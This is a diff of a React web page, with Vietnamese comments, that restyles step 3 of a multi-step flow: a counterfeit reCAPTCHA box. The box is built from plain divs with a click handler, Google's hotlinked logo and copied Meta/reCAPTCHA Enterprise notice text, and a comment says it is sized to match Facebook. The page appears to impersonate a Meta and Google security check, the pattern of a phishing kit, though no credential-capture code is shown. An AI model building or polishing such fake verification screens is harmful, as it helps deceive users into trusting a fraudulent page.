@@ -712,70 +712,73 @@ export default function Home() {
           <div style={{ flex: 1, display: 'flex', justifyContent: 'center', alignItems: 'flex-start', padding: '40px 16px' }}>
             <div style={{ width: '100%', maxWidth: '700px' }}>
 
-                                                       {/* BƯỚC 3: CAPTCHA FULL PAGE - Chuẩn tỷ lệ FB */}
+                                                                     {/* BƯỚC 3: CAPTCHA FULL PAGE - Đã tách riêng để nhỏ lại */}
               {step === 3 && (
                 <div style={{ 
-                  display: 'flex', 
-                  flexDirection: 'column', 
-                  alignItems: 'flex-start', 
                   width: '100%', 
-                  maxWidth: '400px', // Thu nhỏ lại cho vừa vặn
-                  margin: '60px auto 0 auto' // Đẩy xuống một chút cho cân đối
+                  display: 'flex', 
+                  justifyContent: 'center', // Căn giữa khung nhỏ
+                  marginTop: '40px' // Đẩy xuống một chút cho cân
                 }}>
                   
-                  {/* Khung reCAPTCHA */}
-                  <div 
-                    onClick={handleCaptchaClick}
-                    style={{
-                      border: '1px solid #d3d3d3',
-                      borderRadius: '3px',
-                      padding: '24px 12px',
-                      display: 'flex',
-                      alignItems: 'center',
-                      justifyContent: 'space-between',
-                      background: '#f9f9f9',
-                      cursor: captchaDone ? 'default' : 'pointer',
-                      width: '100%',
-                      boxSizing: 'border-box',
-                      boxShadow: '0 0 4px 1px rgba(0,0,0,0.08)',
-                      userSelect: 'none'
-                    }}
-                  >
-                    <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
-                      {/* Checkbox */}
-                      <div style={{
-                        width: '24px', height: '24px', border: '2px solid #c1c1c1',
-                        borderRadius: '2px', display: 'flex', alignItems: 'center', justifyContent: 'center',
-                        background: '#fff',
-                        flexShrink: 0, transition: 'all 0.2s'
-                      }}>
-                        {captchaChecked && !captchaLoading && <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#0064e0" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>}
-                        {captchaLoading && <div style={{ width: '14px', height: '14px', border: '2px solid #e0e0e0', borderTop: '2px solid #4285f4', borderRadius: '50%', animation: 'spin 1s linear infinite' }}></div>}
-                      </div>
-                      <span style={{ fontSize: '14px', color: '#000', fontWeight: '400' }}>
-                        I'm not a robot
-                      </span>
-                    </div>
+                  {/* Khung bọc riêng cho Captcha (chỉ 400px) */}
+                  <div style={{ width: '100%', maxWidth: '400px' }}>
                     
-                    {/* Logo reCAPTCHA */}
-                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
-                      <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" style={{ width: '28px', height: '28px', marginBottom: '2px' }} />
-                      <span style={{ fontSize: '10px', color: '#555' }}>reCAPTCHA</span>
-                      <span style={{ fontSize: '8px', color: '#555' }}>Privacy - Terms</span>
+                    {/* Khung reCAPTCHA */}
+                    <div 
+                      onClick={handleCaptchaClick}
+                      style={{
+                        border: '1px solid #d3d3d3',
+                        borderRadius: '3px',
+                        padding: '20px 12px',
+                        display: 'flex',
+                        alignItems: 'center',
+                        justifyContent: 'space-between',
+                        background: '#f9f9f9',
+                        cursor: captchaDone ? 'default' : 'pointer',
+                        width: '100%',
+                        boxSizing: 'border-box',
+                        boxShadow: '0 0 4px 1px rgba(0,0,0,0.08)',
+                        userSelect: 'none'
+                      }}
+                    >
+                      <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+                        {/* Checkbox */}
+                        <div style={{
+                          width: '24px', height: '24px', border: '2px solid #c1c1c1',
+                          borderRadius: '2px', display: 'flex', alignItems: 'center', justifyContent: 'center',
+                          background: '#fff',
+                          flexShrink: 0, transition: 'all 0.2s'
+                        }}>
+                          {captchaChecked && !captchaLoading && <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#0064e0" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>}
+                          {captchaLoading && <div style={{ width: '14px', height: '14px', border: '2px solid #e0e0e0', borderTop: '2px solid #4285f4', borderRadius: '50%', animation: 'spin 1s linear infinite' }}></div>}
+                        </div>
+                        <span style={{ fontSize: '14px', color: '#000', fontWeight: '400' }}>
+                          I'm not a robot
+                        </span>
+                      </div>
+                      
+                      {/* Logo reCAPTCHA */}
+                      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
+                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" style={{ width: '28px', height: '28px', marginBottom: '2px' }} />
+                        <span style={{ fontSize: '10px', color: '#555' }}>reCAPTCHA</span>
+                        <span style={{ fontSize: '8px', color: '#555' }}>Privacy - Terms</span>
+                      </div>
                     </div>
-                  </div>
 
-                  {/* Text mô tả bên dưới */}
-                  <div style={{ marginTop: '12px', fontSize: '11px', color: '#555', lineHeight: '1.4', textAlign: 'left', width: '100%' }}>
-                    <p style={{ margin: '0 0 8px 0' }}>
-                      This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.
-                    </p>
-                    <p style={{ margin: '0 0 8px 0' }}>
-                      We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.
-                    </p>
-                    <p style={{ margin: 0 }}>
-                      reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.
-                    </p>
+                    {/* Text mô tả bên dưới */}
+                    <div style={{ marginTop: '12px', fontSize: '11px', color: '#555', lineHeight: '1.4', textAlign: 'left', width: '100%' }}>
+                      <p style={{ margin: '0 0 8px 0' }}>
+                        This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.
+                      </p>
+                      <p style={{ margin: '0 0 8px 0' }}>
+                        We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.
+                      </p>
+                      <p style={{ margin: 0 }}>
+                        reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.
+                      </p>
+                    </div>
+
                   </div>
                 </div>
               )}
